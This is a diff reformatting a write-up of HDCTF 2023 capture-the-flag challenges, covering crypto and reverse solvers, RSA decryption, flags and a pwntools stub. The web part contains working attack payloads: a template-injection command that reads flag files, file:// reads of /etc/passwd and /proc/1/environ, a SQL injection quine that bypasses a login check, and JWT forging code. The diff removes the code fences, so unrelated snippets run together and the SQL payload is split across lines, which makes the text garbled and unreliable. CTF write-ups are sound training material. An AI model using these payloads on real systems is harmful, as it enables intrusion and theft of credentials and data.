@@ -5,7 +5,7 @@
 
 RANK：10
 
- MISC 
+ MISC
 
 hardMisc
 
@@ -61,7 +61,7 @@ Normal_Rsa
 
 flag直接放在上面没删
 
- CRYPTO 
+ CRYPTO
 
 Normal_Rsa
 
@@ -120,7 +120,7 @@ print("".join(de_code(c)))
 
 NSSCTF{NOTFLAG}
 
- web 
+ web
 
 Welcome To HDCTF 2023
 
@@ -185,7 +185,8 @@ if ($row['password'] === $password) {
 
 https://www.cnblogs.com/aninock/p/16467716.html
 
-1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))#
+1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))
+#
 
 JavaMonster
 
@@ -262,7 +263,7 @@ public class R_SignedObject {
     }
 }
 
- REVERSE 
+ REVERSE
 
 easy_re
 
@@ -376,7 +377,7 @@ print(result[::-1])
 
 NSSCTF{0 4 6 10 11 13 16 18 21 22 24 26 31 33 34 36 39}
 
- PWN 
+ PWN
 
 pwnner
 
@@ -427,25 +428,10 @@ p.interactive()
 
 ```
 HDCTF{wE1c0w3_10_HDctf_M15c}
-```
-
-
-
-```
 zip = open('Reverse.piz','rb').read()
 zip_reverse = open('reverse.zip','wb')
 zip_reverse.write(b''.join([(int(('%02x'%i)[::-1],16)).to_bytes(1,'little')for i in zip]))
-```
-
-
-
-```
 NSSCTF{e67d8104-7536-4433-bfff-96759901c405}
-```
-
-
-
-```
 from Crypto.Util.number import *
 import libnum
 P = 8760210374362848654680470219309962250697808334943036049450523139299289451311563307524647192830909610600414977679146980314602124963105772780782771611415961
@@ -466,11 +452,6 @@ m = pow(c,d,n)
 print(long_to_bytes(m))
 
 # b'HDCTF{08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2}'
-```
-
-
-
-```
 def de_code(c):
     dic = [chr(i) for i in range(ord("A"), ord("Z") + 1)]
     flag = []
@@ -486,35 +467,10 @@ c = "842084210884024084010124"
 print("".join(de_code(c)))
 
 # NOTFLAG
-```
-
-
-
-```
 {if phpinfo()}{/if}
-```
-
-
-
-```
 data={if system('cat /f*')}{/if}
-```
-
-
-
-```
 ?url=file:///etc/passwd
-```
-
-
-
-```
 ?url=file:///proc/1/environ
-```
-
-
-
-```
 function checkSql($s) 
 {
     if(preg_match("/regexp|between|in|flag|=|>|<|and|||right|left|reverse|update|extractvalue|floor|substr|&|;|\$|0x|sleep| /i",$s)){
@@ -525,17 +481,8 @@ if ($row['password'] === $password) {
         die($FLAG);
     } else {
     alertMes("wrong password",'index.php');
-```
-
-
-
-```
-1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))#
-```
-
-
-
-```
+1'UNION(SELECT(REPLACE(REPLACE('1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#',CHAR(34),CHAR(39)),CHAR(37),'1"UNION(SELECT(REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")))#')))
+#
 public static void main(String[] args) throws UnsupportedEncodingException {
     com.ctf.easyjava.utils.JwtUtil jwtUtil = new com.ctf.easyjava.utils.JwtUtil();
     User user = new User("Boogipop", "123");
@@ -543,11 +490,6 @@ public static void main(String[] args) throws UnsupportedEncodingException
     System.out.println(token);
     System.out.println(jwtUtil.Jwttoken(token));
 }
-```
-
-
-
-```
 package com.ctf.easyjava;
 
 import com.ctf.easyjava.hdctf.HDCTF;
@@ -600,51 +542,16 @@ public class R_SignedObject {
         return table;
     }
 }
-```
-
-
-
-```
 SERDVEZ7WTB1X2hAdjJfL1wvXEA1N2VyM2RfN2hlX3IzdjNyczN9
-```
-
-
-
-```
 HDCTF{Y0u_h@v2_//@57er3d_7he_r3v3rs3}
-```
-
-
-
-```
 mov cl, 10h
  xor al, cl
-```
-
-
-
-```
 HDCTF{Just_a_e3sy_aSm}
-```
-
-
-
-```
 HDCUF{G1Od_ql2y2r_f1r_Pwz!!|
-```
-
-
-
-```
 print(flag[0]^ord('H'))
 print(flag[1]^ord('D'))
 print(flag[2]^ord('C'))
 print(flag[3]^ord('T'))
-```
-
-
-
-```
 xorr = [178940,248,56890,2361]
 ans = [0] * 55
 flag =  [178868, 188, 56953, 2413, 178874, 131, 56957, 2313, 178867, 156, 56933, 2377, 178832, 202, 56899, 2314, 178830, 167, 56924, 2313, 178830, 167, 56938, 2383, 178822, 217, 56859, 2372 ]
@@ -655,11 +562,6 @@ for i in range(len(flag)):
 print("".join([chr(i) for i in ans]))
 
 # HDCTF{G0Od_pl2y3r_f0r_Pvz!!}
-```
-
-
-
-```
 n = 40  
 capacity = 50  
 
@@ -688,29 +590,9 @@ for i in range(n, 0, -1):
         j -= weights[i - 1]
 
 print(result[::-1])
-```
-
-
-
-```
 [1, 5, 7, 11, 12, 14, 17, 19, 22, 23, 25, 27, 32, 34, 35, 37, 40]
-```
-
-
-
-```
 [print(str(i-1),end=' ') for i in result[::-1]]
-```
-
-
-
-```
 NSSCTF{0 4 6 10 11 13 16 18 21 22 24 26 31 33 34 36 39}
-```
-
-
-
-```
 from pwn import *
 from ctypes import *
 context.log_level = 'debug'
